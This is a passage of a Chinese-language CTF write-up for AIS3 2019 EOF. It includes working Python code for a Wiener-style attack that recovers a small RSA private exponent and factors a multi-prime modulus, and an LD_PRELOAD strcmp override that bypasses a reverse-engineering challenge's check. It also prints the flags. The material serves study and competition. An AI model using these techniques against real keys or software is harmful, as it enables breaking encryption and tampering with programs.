class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> ContFrac</span><br><span class="line"><span class="keyword">import</span> arithm</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> isPrime, getPrime</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_d_phi</span>(<span class="params">N, e</span>):</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    get d, phi by using continuous</span></span><br><span class="line"><span class="string">    fraction apporximation</span></span><br><span class="line"><span class="string">    where e * d = k * phi(N) + 1</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    fr = ContFrac.r_to_fr(e, N)</span><br><span class="line">    co = ContFrac.convfr(fr)</span><br><span class="line">    <span class="keyword">for</span> k, d <span class="keyword">in</span> co:</span><br><span class="line">        <span class="keyword">if</span> k == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        phi = (e * d - <span class="number">1</span>) // k</span><br><span class="line">        <span class="keyword">if</span> phi % (<span class="number">2</span> ** <span class="number">4</span>) != <span class="number">0</span>:</span><br><span class="line">            <span class="comment"># phi should be a multiple to 2^4</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        possible = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">            <span class="comment"># test the property of phi</span></span><br><span class="line">            m = random.randint(<span class="number">0</span>, N - <span class="number">1</span>)</span><br><span class="line">            <span class="keyword">if</span> arithm.qpow(arithm.qpow(m, e, N), d, N) != m:</span><br><span class="line">                possible = <span class="literal">False</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> possible:</span><br><span class="line">            <span class="keyword">return</span> d, phi</span><br><span class="line">    <span class="keyword">return</span> -<span class="number">1</span>, -<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_factor</span>(<span class="params">e, d, N</span>):</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    get factor of n with e and d</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    kphi = e * d - <span class="number">1</span></span><br><span class="line">    u, t = kphi, <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> u % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">        u &gt;&gt;= <span class="number">1</span></span><br><span class="line">        t += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    pre_w = N - <span class="number">1</span></span><br><span class="line">    w = random.randint(<span class="number">2</span>, N - <span class="number">2</span>)</span><br><span class="line">    w = arithm.qpow(w, u, N)</span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> <span class="built_in">range</span>(t):</span><br><span class="line">        <span class="keyword">if</span> w == <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">if</span> pre_w == N - <span class="number">1</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">return</span> arithm.gcd(pre_w + <span class="number">1</span>, N)</span><br><span class="line">        pre_w = w</span><br><span class="line">        w = w * w % N</span><br><span class="line">    <span class="keyword">return</span> -<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">factorize2</span>(<span class="params">e, d, N</span>):</span></span><br><span class="line">    f = get_factor(e, d, N)</span><br><span class="line">    <span class="keyword">while</span> f == -<span class="number">1</span>:</span><br><span class="line">        f = get_factor(e, d, N)</span><br><span class="line">    <span class="keyword">return</span> f, N//f</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">factorize3</span>(<span class="params">e, d, N</span>):</span></span><br><span class="line">    f = get_factor(e, d, N)</span><br><span class="line">    <span class="keyword">while</span> f == -<span class="number">1</span>:</span><br><span class="line">        f = get_factor(e, d, N)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> isPrime(f):</span><br><span class="line">        f = N // f</span><br><span class="line">    p, q = factorize2(e, d, N // f)</span><br><span class="line">    <span class="keyword">return</span> p, q, f</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">factorize4</span>(<span class="params">e, d, N</span>):</span></span><br><span class="line">    f = get_factor(e, d, N)</span><br><span class="line">    <span class="keyword">while</span> f == -<span class="number">1</span>:</span><br><span class="line">        f = get_factor(e, d, N)</span><br><span class="line">        <span class="keyword">if</span> f == -<span class="number">1</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> isPrime(f):</span><br><span class="line">            f = N // f</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> isPrime(f):</span><br><span class="line">            f = -<span class="number">1</span></span><br><span class="line">    p, q, r = factorize3(e, d, N // f)</span><br><span class="line">    <span class="keyword">return</span> f, p, q, r</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    N should be in P*Q*R*S form</span></span><br><span class="line"><span class="string">    where P,Q,R,S are prime</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    p = getPrime(<span class="number">64</span>)</span><br><span class="line">    q = getPrime(<span class="number">64</span>)</span><br><span class="line">    r = getPrime(<span class="number">64</span>)</span><br><span class="line">    s = getPrime(<span class="number">64</span>)</span><br><span class="line">    d = getPrime(<span class="number">16</span>)</span><br><span class="line">    n = p * q * r * s</span><br><span class="line">    phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>) * (r - <span class="number">1</span>) * (s - <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">while</span> arithm.gcd(d, phi) != <span class="number">1</span>:</span><br><span class="line">        d = getPrime(<span class="number">16</span>)</span><br><span class="line">    e = arithm.inv(d, phi)</span><br><span class="line">    print(<span class="string">&#x27;p =&#x27;</span>, p)</span><br><span class="line">    print(<span class="string">&#x27;q =&#x27;</span>, q)</span><br><span class="line">    print(<span class="string">&#x27;r =&#x27;</span>, r)</span><br><span class="line">    print(<span class="string">&#x27;s =&#x27;</span>, s)</span><br><span class="line">    print(<span class="string">&#x27;d =&#x27;</span>, d)</span><br><span class="line">    print(<span class="string">&#x27;e =&#x27;</span>, e)</span><br><span class="line">    print(<span class="string">&#x27;phi =&#x27;</span>, phi)</span><br><span class="line">    print(<span class="string">&#x27;kphi =&#x27;</span>, e * d - <span class="number">1</span>)</span><br><span class="line">    print(factorize4(e, d, n))</span><br></pre></td></tr></table></figure>

<p>ContFrac.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">r_to_fr</span>(<span class="params">a, b</span>):</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    converts rational fraction a/b to</span></span><br><span class="line"><span class="string">    a list of partial quotients [p0, ..., pn]</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    fr = []</span><br><span class="line">    <span class="keyword">while</span> b &gt; <span class="number">0</span>:</span><br><span class="line">        fr.append(a // b)</span><br><span class="line">        c = a</span><br><span class="line">        a = b</span><br><span class="line">        b = c % b</span><br><span class="line">    <span class="keyword">return</span> fr</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fr_to_r</span>(<span class="params">fr</span>):</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    converts a continued fraction [p0, ..., pn]</span></span><br><span class="line"><span class="string">    to a rational fraction a/b.</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(fr) == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>, <span class="number">1</span></span><br><span class="line">    a, b = fr[-<span class="number">1</span>], <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> p <span class="keyword">in</span> <span class="built_in">reversed</span>(fr[:-<span class="number">1</span>]):</span><br><span class="line">        <span class="comment"># p + 1 / (a / b)</span></span><br><span class="line">        <span class="comment"># p + b / a</span></span><br><span class="line">        <span class="comment"># (p * a + b) / a</span></span><br><span class="line">        a, b = p * a + b, a</span><br><span class="line">    <span class="keyword">return</span> a, b</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">convfr</span>(<span class="params">fr</span>):</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    computes the list of convergents</span></span><br><span class="line"><span class="string">    using the list of partial quotients</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    c = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(fr)):</span><br><span class="line">        c.append(fr_to_r(fr[:i]))</span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">assert</span>(r_to_fr(<span class="number">103</span>, <span class="number">24</span>) == [<span class="number">4</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">3</span>])</span><br><span class="line">    <span class="keyword">assert</span>(r_to_fr(<span class="number">21</span>, <span class="number">73</span>) == [<span class="number">0</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">10</span>])</span><br><span class="line">    <span class="keyword">assert</span>(fr_to_r(r_to_fr(<span class="number">21</span>, <span class="number">73</span>)) == (<span class="number">21</span>, <span class="number">73</span>))</span><br><span class="line">    <span class="keyword">assert</span>(fr_to_r(r_to_fr(<span class="number">1290312</span>, <span class="number">239081</span>)) == (<span class="number">1290312</span>, <span class="number">239081</span>))</span><br><span class="line">    print(<span class="string">&#x27;OK&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>arithm.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">from https://github.com/pablocelayes/rsa-wiener-attack/blob/master/Arithmetic.py</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">egcd</span>(<span class="params">a,b</span>):</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    Extended Euclidean Algorithm</span></span><br><span class="line"><span class="string">    returns x, y, gcd(a,b) such that ax + by = gcd(a,b)</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    u, u1 = <span class="number">1</span>, <span class="number">0</span></span><br><span class="line">    v, v1 = <span class="number">0</span>, <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> b:</span><br><span class="line">        q = a // b</span><br><span class="line">        u, u1 = u1, u - q * u1</span><br><span class="line">        v, v1 = v1, v - q * v1</span><br><span class="line">        a, b = b, a - q * b</span><br><span class="line">    <span class="keyword">return</span> u, v, a</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gcd</span>(<span class="params">a,b</span>):</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    2.8 times faster than egcd(a,b)[2]</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    a,b=(b,a) <span class="keyword">if</span> a&lt;b <span class="keyword">else</span> (a,b)</span><br><span class="line">    <span class="keyword">while</span> b:</span><br><span class="line">        a,b=b,a%b</span><br><span class="line">    <span class="keyword">return</span> a</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">inv</span>(<span class="params">e,n</span>):</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    d such that de = 1 (mod n)</span></span><br><span class="line"><span class="string">    e must be coprime to n</span></span><br><span class="line"><span class="string">    this is assumed to be true</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> egcd(e,n)[<span class="number">0</span>]%n</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">qpow</span>(<span class="params">a, b, m</span>):</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    equals to pow(a, b) % m</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    r = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> b:</span><br><span class="line">        <span class="keyword">if</span> b &amp; <span class="number">1</span>:</span><br><span class="line">            r = r * a % m</span><br><span class="line">        b &gt;&gt;= <span class="number">1</span></span><br><span class="line">        a = a * a % m</span><br><span class="line">    <span class="keyword">return</span> r % m</span><br></pre></td></tr></table></figure>

<p>最後Flag: <code>EOF&#123;Did_you_USe_Wiener_Or_Boneh_Durfee?&#125;</code></p>
<h3 id="Train-Revenge"><a href="#Train-Revenge" class="headerlink" title="Train Revenge"></a>Train Revenge</h3><p>附個檔案<a href="Train_Revenge/server.py">server.py</a>, <a href="Train_Revenge/BlockCipher.py">BlockCipher.py</a></p>
<p>然後留個坑，沒看完這題w</p>
<h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="Gift"><a href="#Gift" class="headerlink" title="Gift"></a>Gift</h3><p>拿到一個<a href="Gift/gift.gz">gz檔</a>，解開拿到一個binary，拖進IDA後看到一個很不知道要幹嘛的東西</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v3; <span class="comment">// r12</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [rsp+Ch] [rbp-234h]</span></span><br><span class="line">  <span class="keyword">char</span> s2[<span class="number">272</span>]; <span class="comment">// [rsp+10h] [rbp-230h]</span></span><br><span class="line">  <span class="keyword">char</span> s1; <span class="comment">// [rsp+120h] [rbp-120h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v8; <span class="comment">// [rsp+228h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v8 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">strcpy</span>(</span><br><span class="line">    s2,</span><br><span class="line">    <span class="string">&quot;0YO7DD8QP2QBM8AUFP4P9RJUB6KVYE1PHMMPYWNEWR64P3L68E21LUPH15UTVDJ3NET7654PBSK1P7E8037H88M4YGJ0AK8USN52KGDDF57OBKBJXL14&quot;</span></span><br><span class="line">    <span class="string">&quot;R2B2XP8G20YLWX9J0ROPBMCX41J4Q5Q3F2HQ02BCR8G9I1UMSPE4973XYLA4OJOMWN22XJ91SF0XMU9GJ6XJ06JIV37LHA3L0ZIMQC1F7RLIP2HYDBOS&quot;</span></span><br><span class="line">    <span class="string">&quot;WC4LV7M0XKQMMBUEYXRLYI5J&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Tell me the secret you found&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%256s&quot;</span>, &amp;s1);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(&amp;s1, s2) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">3389077</span>; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      v3 = byte_601080[i];</span><br><span class="line">      byte_601080[i] = s2[i % <span class="built_in">strlen</span>(s2)] ^ v3;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Ok, that sounds good&quot;</span>);</span><br><span class="line">    write(<span class="number">1</span>, byte_601080, <span class="number">0x33B696</span>uLL);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;wrong&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>嘗試把那個字串塞進stdin後噴出一堆莫名其妙的東西，後來把他輸出成檔案後，<code>file</code>一下發現輸出是個一個類似結構的東西，連續做了好幾次後就覺得是要一職重複做這件事，但是很麻煩的是我又不知道要怎麼把那個字串弄出來，<code>strings</code>出來的東西也不好<code>grep</code>，最後決定掛個LD_PRELOAD，把<code>strcmp</code>直接蓋成跟<code>strcpy</code>差不多的東西，具體如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">strcmp</span> <span class="params">( <span class="keyword">const</span> <span class="keyword">char</span> * str1, <span class="keyword">const</span> <span class="keyword">char</span> * str2 )</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *a = str1, *b = str2;</span><br><span class="line">    <span class="keyword">while</span> (*b != <span class="string">&#x27;\0&#x27;</span>)</span><br><span class="line">        *(a++) = *(b++);</span><br><span class="line">    *a = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>這樣他每次檢查都會通過，而且就幫我填好buffer了XD</p>
<p>接著重複跑個大概1000多次後，輸出的東西就變成flag了XD</p>
<p>最後Flag: <code>EOF&#123;re_re_re_re_reverse_U_ju5t_reverse_m3_1000_times!!&#125;</code></p>
<h3 id="Vault"><a href="#Vault" class="headerlink" title="Vault"></a>Vault</h3><p>附個檔案 <a href="Vault/vault_html">vault.html</a>, <a href="Vault/vault_js">vault.js</a>, <a href="Vault/vault_wasm">vault.wasm</a></p>
<p>splitline做的@@</p>
<p>不太會逆web assembly</p>
<h3 id="Tree"><a href="#Tree" class="headerlink" title="Tree"></a>Tree</h3><p>附個檔案 <a href="Tree/tree">tree</a></p>
<p>IDA開起來看到是一個Treap based的Link/Cut Tree就放棄了w</p>
<p>超級不喜歡Link/Cut Tree的說(其實只是我爛)</p>
<p>想說拿angr直接炸，不過最後也沒炸出來w</p>
<p>附個出題者在聊天室留的解</p>
<blockquote>
<p>就是經過觀察之後會發現，每次會檢查樹上一條鏈的總和是否為X，然後檢查1000次 然後把輸入裡面的六個字代入2^(1~6)然後剩下的代入2^7，然後用gdb看看適用什麼東西跟X做檢查<br>最後整理一下就會得到一堆2k7<br>一堆的N元一次方程式<br>然後丟z3就解掉了</p>
</blockquote>
<h3 id="Compiler"><a href="#Compiler" class="headerlink" title="Compiler"></a>Compiler</h3><p>附個檔案 <a href="Compiler/compiler">compiler</a></p>
<p>不過我沒看這題@@</p>
<p>然後周逸表示</p>
<blockquote>
<p>compiler我估計用這個方法就能做掉了 <a target="_blank" rel="noopener" href="https://ctf-wiki.github.io/ctf-tools/binary_core_tools/instrumentation/intel_pin/">https://ctf-wiki.github.io/ctf-tools/binary_core_tools/instrumentation/intel_pin/</a></p>
</blockquote>
<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><p>這次web看起來都很血腥就沒看了，而且想說splitline的web比我強太多了，除非有看起來很水但他懶得做的我再去看看就好了w</p>
<h3 id="babyRMI2"><a href="#babyRMI2" class="headerlink" title="babyRMI2"></a>babyRMI2</h3><p>splitline做的，初賽我也沒做babyRMI，看到Java就逃了w</p>
<p>下次應該認真看的</p>
<p>附個檔案 <a href="babyRMI2/src.zip">src.zip</a></p>
<h3 id="Babyfirst-Revenge-Remastered"><a href="#Babyfirst-Revenge-Remastered" class="headerlink" title="Babyfirst Revenge: Remastered"></a>Babyfirst Revenge: Remastered</h3><p>不熟windows command line，但總覺得也該學一下，完整可以看官方的解</p>
<h3 id="Imagination"><a href="#Imagination" class="headerlink" title="Imagination"></a>Imagination</h3><p>沒看@@</p>
<p>splitline說是蓋python cache，不過他好像沒空做完QAQ</p>
<h3 id="CureURL"><a href="#CureURL" class="headerlink" title="CureURL"></a>CureURL</h3><p>Cyku出的，不過我不熟Redis，所以看到redis就跳過了QAQ</p>
<p>附個檔案 <a href="CureURL/cureurl.zip">cureurl.zip</a></p>
<h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><p>今年還是不會Pwn QAQ</p>
<p>附個檔案在這</p>
<h3 id="Whitehole"><a href="#Whitehole" class="headerlink" title="Whitehole"></a>Whitehole</h3><p><a href="Whitehole/whitehole">whitehole</a>, <a href="Whitehole/libc-2.27.so">libc-2.27.so</a></p>
<h3 id="Blackhole"><a href="#Blackhole" class="headerlink" title="Blackhole"></a>Blackhole</h3><p><a href="Blackhole/blackhole">blackhole</a>, <a href="Blackhole/libc-2.27.so">libc-2.27.so</a></p>
<h3 id="EasierROP"><a href="#EasierROP" class="headerlink" title="EasierROP"></a>EasierROP</h3><p><a href="EasierROP/easierROP">easierROP</a>, <a href="EasierROP/libc.so.6">libc.so.6</a></p>
<h3 id="nonono-revenge"><a href="#nonono-revenge" class="headerlink" title="nonono_revenge"></a>nonono_revenge</h3><p><a href="nonono_revenge/nonono_revenge">nonono_revenge</a>, <a href="nonono_revenge/fake_flag">fake_flag</a>, <a href="nonono_revenge/libc.so.6">libc.so.6</a></p>
<h3 id="TT-Revenge"><a href="#TT-Revenge" class="headerlink" title="TT Revenge"></a>TT Revenge</h3><p><a href="TT_Revenge/tt_revenge">tt_revenge</a>, <a href="TT_Revenge/libc-2.29.so">libc-2.29.so</a></p>

  </article>
  <aside class="table-content" id="site-toc">
  <div class="table-content-title">
    <i class="fa fa-arrow-right fa-lg" id="site-toc-hide-btn"></i>
    <span>目录</span>
  </div>
  <div class="table-content-main">
    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Misc"><span class="toc-text">Misc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#recovery"><span class="toc-text">recovery</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#TT"><span class="toc-text">TT</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Unlucky"><span class="toc-text">Unlucky</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Crypto"><span class="toc-text">Crypto</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Lucky"><span class="toc-text">Lucky</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Art"><span class="toc-text">Art</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Train-Revenge"><span class="toc-text">Train Revenge</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reverse"><span class="toc-text">Reverse</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Gift"><span class="toc-text">Gift</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Vault"><span class="toc-text">Vault</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Tree"><span class="toc-text">Tree</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Compiler"><span class="toc-text">Compiler</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Web"><span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#babyRMI2"><span class="toc-text">babyRMI2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Babyfirst-Revenge-Remastered"><span class="toc-text">Babyfirst Revenge: Remastered</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Imagination"><span class="toc-text">Imagination</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CureURL"><span class="toc-text">CureURL</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pwn"><span class="toc-text">Pwn</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Whitehole"><span class="toc-text">Whitehole</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Blackhole"><span class="toc-text">Blackhole</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EasierROP"><span class="toc-text">EasierROP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#nonono-revenge"><span class="toc-text">nonono_revenge</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#TT-Revenge"><span class="toc-text">TT Revenge</span></a></li></ol></li></ol>
  </div>
</aside>
  
  
    <div class="passage-tags">
     
      <a href="/tags/AIS3/"><i class="fa fa-tags"></i>AIS3</a>
     
      <a href="/tags/CTF/"><i class="fa fa-tags"></i>CTF</a>
    
    </div>
  
</div>


    </main>
    
      
<div class="site-comment-contanier" data-plateform="disqus">
  
    <div id="disqus_thread"></div>
    <script async>
      var disqus_config = function() {
        this.page.url = `${window.location.origin}${window.location.pathname}`;
        this.page.identifier = "AIS3-2019-EOF";
      };
      (function() {
        var d = document, s = d.createElement('script');
        s.src = 'https://ctf-ototot.disqus.com/embed.js';
        s.setAttribute('data-timestamp', +new Date());
        (d.head || d.body).appendChild(s);
      })();
    </script>
  
</div>

    
    <div class="site-footer-wrapper">
  <footer class="site-footer">
    
      
        <div class="site-footer-col">
          <h5 class="site-footer-title">更多關於我</h5>
          
            <span class="site-footer-item">
